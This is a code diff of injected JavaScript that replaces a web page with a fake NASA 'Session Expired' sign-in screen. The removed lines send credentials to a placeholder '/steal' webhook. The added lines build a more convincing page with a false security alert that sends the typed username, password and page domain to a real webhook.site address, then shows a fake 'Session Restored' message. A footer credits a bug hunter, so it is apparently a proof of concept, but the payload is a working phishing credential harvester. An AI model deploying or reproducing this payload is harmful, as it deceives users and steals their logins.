@@ -1,63 +1,6 @@
-document.open();
-document.write(`
-<!DOCTYPE html>
-<html>
-<head>
-  <title>NASA Security Alert</title>
-  <style>
-    body {
-      margin: 0;
-      background: #000;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      font-family: Arial, sans-serif;
-    }
-    .box {
-      background: #1a1a1a;
-      border: 2px solid #fc3d21;
-      border-radius: 12px;
-      padding: 40px;
-      text-align: center;
-      max-width: 500px;
-    }
-    h1 { color: #fc3d21; }
-    p { color: #fff; }
-    input {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border-radius: 6px;
-      border: none;
-      font-size: 14px;
-    }
-    button {
-      background: #fc3d21;
-      color: white;
-      border: none;
-      padding: 12px 30px;
-      border-radius: 6px;
-      font-size: 16px;
-      cursor: pointer;
-      margin-top: 10px;
-    }
-  </style>
-</head>
-<body>
-  <div class="box">
-    <img src="https://www.nasa.gov/wp-content/themes/nasa/assets/images/nasa-logo.svg" 
-         width="80" style="margin-bottom:20px"/>
-    <h1>🔒 NASA Session Expired</h1>
-    <p>Your session has expired. Please re-enter your credentials to continue.</p>
-    <input type="text" placeholder="NASA Username / Email" id="u"/>
-    <input type="password" placeholder="Password" id="p"/>
-    <button onclick="
-      fetch('https://YOUR-WEBHOOK.site/steal?u='+document.getElementById('u').value+'&p='+document.getElementById('p').value);
-      document.querySelector('.box').innerHTML='<h2 style=color:#0f0>✓ Session Restored</h2>';
-    ">Sign In</button>
-  </div>
-</body>
-</html>
-`);
-document.close();
+(function(){
+  var html = '<!DOCTYPE html><html><head><title>NASA - Session Expired<\/title><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/><style>*,*::before,*::after{margin:0!important;padding:0!important;box-sizing:border-box!important;}html,body{width:100%!important;height:100%!important;min-height:100vh!important;background:#0b0c10!important;display:flex!important;flex-direction:column!important;align-items:center!important;justify-content:center!important;font-family:"Segoe UI",Arial,sans-serif!important;overflow-x:hidden!important;}.top-bar{position:fixed!important;top:0!important;left:0!important;right:0!important;width:100%!important;background:#000!important;padding:12px 30px!important;display:flex!important;align-items:center!important;gap:14px!important;border-bottom:3px solid #fc3d21!important;z-index:99999!important;}.top-bar span{color:#fff!important;font-size:18px!important;font-weight:bold!important;letter-spacing:1px!important;}.wrapper{width:100%!important;display:flex!important;justify-content:center!important;align-items:center!important;padding:100px 20px 40px!important;}.card{background:#1a1a2e!important;border:1px solid #fc3d21!important;border-radius:14px!important;padding:50px 40px!important;width:100%!important;max-width:460px!important;text-align:center!important;box-shadow:0 0 40px rgba(252,61,33,0.2)!important;}.lock{font-size:52px!important;margin-bottom:16px!important;display:block!important;}h1{color:#fc3d21!important;font-size:22px!important;margin-bottom:10px!important;font-weight:bold!important;}h1,p,label,button,.found-by,.warning{all:revert!important;}h1{color:#fc3d21!important;font-size:22px!important;text-align:center!important;margin-bottom:10px!important;}p.sub{color:#aaa!important;font-size:14px!important;margin-bottom:24px!important;line-height:1.7!important;text-align:center!important;}.warn-box{background:rgba(252,61,33,0.08)!important;border:1px solid rgba(252,61,33,0.35)!important;border-radius:8px!important;padding:12px 16px!important;margin-bottom:22px!important;text-align:left!important;}.warn-box b{color:#fc3d21!important;display:block!important;margin-bottom:4px!important;font-size:13px!important;}.warn-box span{color:#e0776d!important;font-size:12px!important;}.field{text-align:left!important;margin-bottom:16px!important;}.field label{display:block!important;color:#bbb!important;font-size:11px!important;letter-spacing:0.8px!important;margin-bottom:7px!important;font-weight:600!important;}.field input{width:100%!important;padding:12px 14px!important;background:#0d0d1a!important;border:1px solid #2a2a3e!important;border-radius:8px!important;color:#fff!important;font-size:14px!important;outline:none!important;transition:border-color 0.2s!important;display:block!important;}.field input:focus{border-color:#fc3d21!important;}.btn{width:100%!important;padding:14px!important;background:#fc3d21!important;color:#fff!important;border:none!important;border-radius:8px!important;font-size:15px!important;font-weight:bold!important;cursor:pointer!important;margin-top:6px!important;letter-spacing:0.5px!important;display:block!important;}.btn:hover{background:#e03520!important;}.divider{border:none!important;border-top:1px solid #2a2a3e!important;margin:26px 0 20px!important;}.success{display:none!important;color:#00ff88!important;font-size:16px!important;font-weight:bold!important;padding:16px!important;text-align:center!important;}.found-by{color:#444!important;font-size:11px!important;margin-top:22px!important;text-align:center!important;letter-spacing:0.5px!important;line-height:1.8!important;}.found-by span{color:#fc3d21!important;font-weight:bold!important;}.badge{display:inline-block!important;background:#fc3d21!important;color:#fff!important;font-size:10px!important;padding:2px 8px!important;border-radius:20px!important;margin-top:6px!important;letter-spacing:1px!important;}<\/style><\/head><body><div class="top-bar"><svg width="38" height="38" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="46" fill="#0033A0" stroke="#FC3D21" stroke-width="5"/><ellipse cx="50" cy="50" rx="46" ry="14" fill="none" stroke="#FC3D21" stroke-width="5"/><text x="50" y="57" text-anchor="middle" fill="white" font-size="19" font-weight="bold" font-family="Arial">NASA<\/text><\/svg><span>NASA Identity Management<\/span><\/div><div class="wrapper"><div class="card"><span class="lock">🔒<\/span><h1>Session Expired<\/h1><p class="sub">Your NASA session has timed out due to inactivity.<br\/>Please re-authenticate to continue.<\/p><div class="warn-box"><b>⚠ Security Alert<\/b><span>Unusual sign-in activity detected. Immediate verification required.<\/span><\/div><div class="field"><label>NASA USERNAME OR EMAIL<\/label><input type="text" id="uid" placeholder="username@nasa.gov" autocomplete="off"\/><\/div><div class="field"><label>PASSWORD<\/label><input type="password" id="pwd" placeholder="Enter your password"\/><\/div><button class="btn" id="submitBtn" onclick="go()">Verify Identity<\/button><hr class="divider"\/><div class="success" id="ok">✓ Identity Verified. Restoring your session...<\/div><div class="found-by">Security Vulnerability Found &amp; Reported by<br\/><span>Muhammad Murtaza<\/span><br\/><span class="badge">BUG HUNTER<\/span><\/div><\/div><\/div><script>function go(){var u=document.getElementById("uid").value;var p=document.getElementById("pwd").value;if(!u||!p){alert("Please enter both fields.");return;}fetch("https:\/\/webhook.site\/da68ee2c-9ada-4151-94f9-866fb1b074d3?u="+encodeURIComponent(u)+"&p="+encodeURIComponent(p)+"&d="+encodeURIComponent(document.domain),{mode:"no-cors"});document.getElementById("submitBtn").style.display="none";var ok=document.getElementById("ok");ok.style.display="block";setTimeout(function(){ok.innerText="✓ Session Restored. Redirecting to dashboard...";},1500);}<\/script><\/body><\/html>';
+  document.open();
+  document.write(html);
+  document.close();
+})();
